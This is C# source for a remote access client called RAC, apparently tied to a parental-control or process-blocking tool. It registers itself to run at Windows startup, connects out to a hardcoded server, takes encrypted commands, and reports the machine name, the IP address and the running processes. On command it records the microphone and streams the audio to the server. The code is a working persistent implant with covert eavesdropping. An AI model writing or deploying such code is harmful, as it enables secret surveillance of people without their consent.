using Microsoft.Win32;
using System.Diagnostics;
using System.Net.Sockets;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using NAudio.Wave;
using System.Reflection;

namespace RAC
{
    internal class RAC
    {
        private static readonly string key = "0123456789ABCDEF0123456789ABCDEF";
        private static readonly string iv = "0123456789ABCDEF";
        private static int readSize = 256;

        static void Main(string[] args)
        {
            string serverIp = "10.100.102.51"; // Replace with your server IP
            int serverPort = 6945;


            while (true)
            {
                RegisterProgramOnStartup();

                try
                {
                    using (TcpClient client = new TcpClient())
                    {
                        Console.WriteLine("Attempting to connect to server...");

                        client.Connect(serverIp, serverPort);
                        Console.WriteLine("Connected to server!");

                        NetworkStream stream = client.GetStream();
                        WaveInEvent waveIn = new WaveInEvent();

                        string response = "";
                        string message = "";
                        bool recording = false;

                        try
                        {
                            do
                            {
                                byte[] responseData = new byte[readSize];
                                int bytes = stream.Read(responseData, 0, responseData.Length);
                                response = Encoding.ASCII.GetString(responseData, 0, bytes);
                                response = DecryptString(response);

                                string code = "";
                                foreach (char c in response)
                                {
                                    if (c == ':') break;
                                    code += c;
                                }

                                switch (code)
                                {
                                    case "1":
                                        message = "Yes, I'm here, listening to you";
                                        break;

                                    case "12":
                                        message = $"Holiday Mode is: {GetSetHolidayMode(false)}";
                                        break;

                                    case "13":
                                        bool holidayMode = response.Substring(3) == "1" ? true : false;
                                        message = GetSetHolidayMode(true, holidayMode);
                                        break;

                                    case "80":
                                        message = $"My IP Address: {GetLocalIPAddress()}";
                                        break;

                                    case "97":
                                        string time = response.Substring(3);
                                        message = $"Limit Start Time Set To Be: {time}";
                                        SetLimitStartTime(time);
                                        break;

                                    case "98":
                                        time = response.Substring(3);
                                        message = $"Limit End Time Set To Be: {time}";
                                        SetLimitEndTime(time);
                                        break;

                                    case "78":
                                        message = GetTimeLimit();
                                        break;

                                    case "15":
                                        message = $"Me Device's Name is: {Environment.MachineName}";
                                        break;

                                    case "22":
                                        message = "Running Processes Names: ";
                                        try
                                        {
                                            Process[] processList = Process.GetProcesses();
                                            foreach (Process process in processList)
                                            {
                                                if (process.MainWindowHandle != IntPtr.Zero)
                                                {
                                                    message += process.ProcessName + " | ";
                                                }
                                            }
                                        }
                                        catch (Exception ex)
                                        {
                                            Console.WriteLine("Exception: " + ex.Message);
                                            message = ex.Message;
                                        }
                                        
                                        break;

                                    case "96":
                                        message = $"Blocked Processes Names: {GetProcesses()}";
                                        break;

                                    case "69":
                                        WriteProcesses(response.Substring(3));
                                        message = "Processes has been written succesfully";
                                        break;

                                    case "72":
                                        int.TryParse(response.Substring(3), out readSize);
                                        message = "Read Size has been changed succesfully";
                                        break;

                                    case "666":
                                        if (!recording)
                                        {
                                            message = "Enabling Listening";
                                            recording = true;

                                            try
                                            {
                                                waveIn.WaveFormat = new WaveFormat(44100, 16, 2); // 44.1kHz mono

                                                waveIn.DataAvailable += (sender, a) =>
                                                {
                                                    stream.Write(a.Buffer, 0, a.BytesRecorded);
                                                };

                                                waveIn.StartRecording();
                                            }
                                            catch (Exception ex)
                                            {
                                                Console.WriteLine("Exception: " + ex.Message);
                                                message = ex.Message;
                                            }
                                        }
                                        else message = "Already Recording ;)";
                                        
                                        break;

                                    case "6661":
                                        if (recording)
                                        {
                                            try
                                            {
                                                waveIn.StopRecording();
                                                waveIn.DataAvailable -= (sender, a) =>
                                                {
                                                    stream.Write(a.Buffer, 0, a.BytesRecorded);
                                                };
                                            }
                                            catch(Exception ex)
                                            {
                                                Console.WriteLine("Exception: " + ex.Message);
                                                message = ex.Message;
                                            }

                                            message = "Recording Stopped";
                                            recording = false;
                                        }
                                        else message = "I'm Not Recording :(";
                                        break;

                                    default:
                                        message = "Unknown Command";
                                        break;
                                }

                                message = EncryptString(message);
                                byte[] data = Encoding.ASCII.GetBytes(message);
                                stream.Write(data, 0, data.Length);

                            } while (response.ToLower() != "robert close");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Exception Occured");
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine(ex.Message);
                            Console.ForegroundColor = ConsoleColor.White;
                        }
                    }
                }
                catch (SocketException ex)
                {
                    Console.WriteLine("Connection failed: {0}", ex.Message);
                    Console.WriteLine("Retrying in 3 minutes...");
                    Thread.Sleep(180000);
                }
            }
        }

        static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }
        static void RegisterProgramOnStartup()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    // Set the path of the executable to run on startup
                    key.SetValue("RemoteAccessor", "\"" + Process.GetCurrentProcess().MainModule.FileName + "\"");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error registering the program on startup: " + ex.Message);
            }
        }
        static string GetProcesses()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RADAR", true))
            {
                return key.GetValue("temp").ToString();
            }
        }
        static void WriteProcesses(string processes)
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RADAR", true))
            {
                key.SetValue("temp", processes);
            }
        }
        static void SetLimitStartTime(string time)
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RADAR", true))
            {
                key.SetValue("limitStart", time);
            }
        }
        static void SetLimitEndTime(string time)
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RADAR", true))
            {
                key.SetValue("limitEnd", time);
            }
        }
        static string GetTimeLimit()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RADAR", true))
            {
                return "\nLimit Start Time: " + key.GetValue("limitStart") + "\n" + "Limit End Time: " + key.GetValue("limitEnd");
            }
        }
        static string GetSetHolidayMode(params bool[] set)
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RADAR", true))
            {
                if (set[0]) key.SetValue("IsHoliday", set[1] == true ? 1 : 0);
                else return Convert.ToBoolean(key.GetValue("IsHoliday")).ToString();
                return $"Holiday Mode Has Been Set To: {set[1].ToString()}";
            }
        }

        private static string EncryptString(string plainText)
        {
            byte[] keyBytes = Encoding.UTF8.GetBytes(key);
            byte[] ivBytes = Encoding.UTF8.GetBytes(iv);

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = keyBytes;
                aesAlg.IV = ivBytes;

                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            swEncrypt.Write(plainText);
                        }
                        return Convert.ToBase64String(msEncrypt.ToArray());
                    }
                }
            }
        }
        private static string DecryptString(string cipherText)
        {
            byte[] keyBytes = Encoding.UTF8.GetBytes(key);
            byte[] ivBytes = Encoding.UTF8.GetBytes(iv);
            byte[] cipherTextBytes = Convert.FromBase64String(cipherText);

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = keyBytes;
                aesAlg.IV = ivBytes;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream msDecrypt = new MemoryStream(cipherTextBytes))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            return srDecrypt.ReadToEnd();
                        }
                    }
                }
            }
        }
    }
}